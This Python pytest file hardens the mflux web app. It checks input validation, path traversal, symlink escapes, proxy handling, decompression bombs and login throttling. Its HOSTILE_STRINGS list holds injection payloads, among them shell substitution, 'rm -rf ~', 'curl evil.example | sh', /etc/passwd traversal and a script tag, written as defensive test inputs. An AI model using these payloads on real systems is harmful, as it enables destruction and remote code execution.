import io
import json
import os
import shlex

import pytest

pytest.importorskip("fastapi")

from fastapi.testclient import TestClient  # noqa: E402
from PIL import Image  # noqa: E402

from mflux.web.app import WebApp  # noqa: E402
from mflux.web.auth import LoginThrottle, WebAuth  # noqa: E402
from mflux.web.invocation import Invocation, InvocationError  # noqa: E402
from mflux.web.paths import PathGuard  # noqa: E402
from mflux.web.schema import FormSchema  # noqa: E402
from mflux.web.settings import WebSettings  # noqa: E402

pytestmark = pytest.mark.fast

COMMAND = "mflux-generate-qwen-2.1"
KEY = "correct-horse-battery"
HOSTILE_STRINGS = [
    "$(touch /tmp/pwned)",
    "`id`",
    "; rm -rf ~ #",
    "a && curl evil.example | sh",
    'it\'s "quoted" \\ back',
    "line one\nline two --steps 1",
    "--output=/etc/passwd",
    "-C /etc/passwd",
    "{seed}{0}%s%n",
    "../../../../etc/passwd",
    "<script>alert(1)</script>",
    "ünïcödé ✓ 🫖",
]


@pytest.fixture(scope="module")
def schema():
    return FormSchema()


@pytest.fixture
def guard(tmp_path):
    (tmp_path / "out/.uploads").mkdir(parents=True)
    return PathGuard(tmp_path / "out", tmp_path / "out/.uploads", [], [])


def build(payload, guard, schema, tmp_path):
    return Invocation.from_payload({"command": COMMAND, **payload}, guard, schema, tmp_path / "out" / "img")


@pytest.mark.parametrize("hostile", HOSTILE_STRINGS)
def test_hostile_prompts_stay_literal(schema, guard, tmp_path, hostile):
    invocation = build({"options": {"--prompt": hostile, "--negative-prompt": hostile}}, guard, schema, tmp_path)
    args = invocation.parse()
    assert args.prompt == hostile and args.negative_prompt == hostile
    assert args.output.startswith(str(tmp_path / "out"))
    assert not hasattr(args, "config_from_metadata") and args.prompt_file is None
    # The copyable command must split back into exactly the same argv: pasting it into a
    # shell cannot run anything the prompt smuggled in.
    assert shlex.split(invocation.shell_command()) == [COMMAND, *invocation.argv, *invocation.lora_argv]


@pytest.mark.parametrize("value", [float("nan"), float("inf"), float("-inf")])
def test_non_finite_numbers_are_rejected(schema, guard, tmp_path, value):
    with pytest.raises(InvocationError, match="finite"):
        build({"options": {"--prompt": "x", "--guidance": value}}, guard, schema, tmp_path)
    with pytest.raises(InvocationError):
        build({"options": {"--prompt": "x"}, "loras": [{"path": "org/lora", "scale": value}]}, guard, schema, tmp_path)


@pytest.mark.parametrize(
    ("options", "message"),
    [
        ({"--steps": 10**9}, "between"),
        ({"--steps": 0}, "between"),
        ({"--width": "9000"}, "between 16"),
        ({"--height": "8"}, "between 16"),
        ({"--width": "50x"}, "at most"),
        ({"--width": "0x"}, "above 0x"),
        ({"--mlx-cache-limit-gb": -1}, "between"),
        ({"--prompt": "a\x00b"}, "NUL"),
        ({"--prompt": "x" * 20_001}, "too long"),
    ],
)
def test_resource_bounds(schema, guard, tmp_path, options, message):
    with pytest.raises(InvocationError, match=message):
        build({"options": {"--prompt": "x", **options}}, guard, schema, tmp_path)


@pytest.mark.parametrize("seed", [str(2**63), "١٢٣", "-1", "1e9"])
def test_out_of_range_or_non_ascii_seeds_are_rejected(schema, guard, tmp_path, seed):
    with pytest.raises(InvocationError, match="Invalid seed"):
        build({"options": {"--prompt": "x"}, "seeds": [seed]}, guard, schema, tmp_path)


def test_unknown_payload_values_cannot_inject_flags(schema, guard, tmp_path):
    for flag in ("--lora-paths", "--image-path", "--stepwise-image-output-dir", "--auto-seeds", "--no-metadata"):
        with pytest.raises(InvocationError, match="not allowed"):
            build({"options": {"--prompt": "x", flag: "/etc"}}, guard, schema, tmp_path)
    with pytest.raises(InvocationError, match="must be one of"):
        build({"options": {"--prompt": "x", "--base-model": "/etc/passwd"}}, guard, schema, tmp_path)


def make_web(tmp_path, **overrides):
    settings = WebSettings(
        output_dir=tmp_path / "out", config_path=tmp_path / "web.json", secret_key="s" * 64, **overrides
    )
    settings.upload_dir.mkdir(parents=True, exist_ok=True)
    return WebApp(settings)


def client_for(web):
    return TestClient(web.app, base_url="http://127.0.0.1:8001", client=("127.0.0.1", 50000))


def csrf(client):
    return {"X-MFlux-CSRF": client.get("/api/session").json()["csrf"]}


def test_nan_in_raw_json_body_is_rejected(tmp_path):
    client = client_for(make_web(tmp_path))
    body = '{"command": "%s", "options": {"--prompt": "x", "--steps": NaN}}' % COMMAND
    response = client.post("/api/validate", content=body, headers={**csrf(client), "Content-Type": "application/json"})
    assert response.status_code == 400


@pytest.mark.parametrize("header", ["X-Forwarded-For", "Forwarded", "X-Real-IP", "X-Forwarded-Host"])
def test_proxied_requests_refused_without_auth(tmp_path, header):
    client = client_for(make_web(tmp_path))
    assert client.get("/api/commands", headers={header: "203.0.113.9"}).status_code == 403


def test_proxied_requests_allowed_with_auth_but_setup_is_not(tmp_path):
    web = make_web(tmp_path, api_key_hash=WebAuth.hash_key(KEY))
    client = client_for(web)
    headers = {"X-Forwarded-For": "203.0.113.9", "Authorization": f"Bearer {KEY}"}
    assert client.get("/api/commands", headers=headers).status_code == 200
    fresh = make_web(tmp_path / "second", require_auth=True)
    proxied = client_for(fresh)
    body = {"api_key": KEY, "api_key_confirm": KEY}
    response = proxied.post("/api/setup", json=body, headers={**csrf(proxied), "X-Forwarded-For": "203.0.113.9"})
    assert response.status_code == 403


def test_symlinked_images_and_sidecars_never_leave_output_dir(tmp_path):
    web = make_web(tmp_path)
    out = web.settings.output_dir
    secret = tmp_path / "secret.json"
    secret.write_text(json.dumps({"prompt": "SECRET"}))
    (tmp_path / "secret.png").write_bytes(b"SECRET")
    buffer = io.BytesIO()
    Image.new("RGB", (4, 4)).save(buffer, format="PNG")
    (out / "real.png").write_bytes(buffer.getvalue())
    os.symlink(secret, out / "real.metadata.json")
    os.symlink(tmp_path / "secret.png", out / "link.png")
    client = client_for(web)
    listing = client.get("/api/gallery").json()
    assert [item["name"] for item in listing["items"]] == ["real.png"]
    assert listing["items"][0]["prompt"] is None
    assert client.get("/api/images/real.png/metadata").json()["metadata"] is None
    assert client.get("/api/images/link.png").status_code == 400
    assert client.delete("/api/images/link.png", headers=csrf(client)).status_code == 400
    assert (tmp_path / "secret.png").exists()


@pytest.mark.parametrize("name", ["..%2F..%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd", "..", ".uploads", "a%00.png", "~root"])
def test_image_endpoints_reject_traversal(tmp_path, name):
    client = client_for(make_web(tmp_path))
    assert client.get(f"/api/images/{name}").status_code in (400, 404)
    assert client.get(f"/api/images/{name}/metadata").status_code in (400, 404)


@pytest.mark.filterwarnings("ignore::PIL.Image.DecompressionBombWarning")
def test_decompression_bomb_upload_is_refused_before_decoding(tmp_path):
    client = client_for(make_web(tmp_path))
    buffer = io.BytesIO()
    Image.new("1", (10_000, 10_000)).save(buffer, format="PNG")
    response = client.post(
        "/api/uploads", files={"file": ("bomb.png", buffer.getvalue(), "image/png")}, headers=csrf(client)
    )
    assert response.status_code == 400 and "too large" in response.json()["detail"]


def test_throttle_table_is_bounded(monkeypatch):
    monkeypatch.setattr(LoginThrottle, "MAX_TRACKED_CLIENTS", 50)
    throttle = LoginThrottle()
    for index in range(500):
        throttle.record_failure(f"10.0.{index // 256}.{index % 256}")
    assert len(throttle._failures) == 50
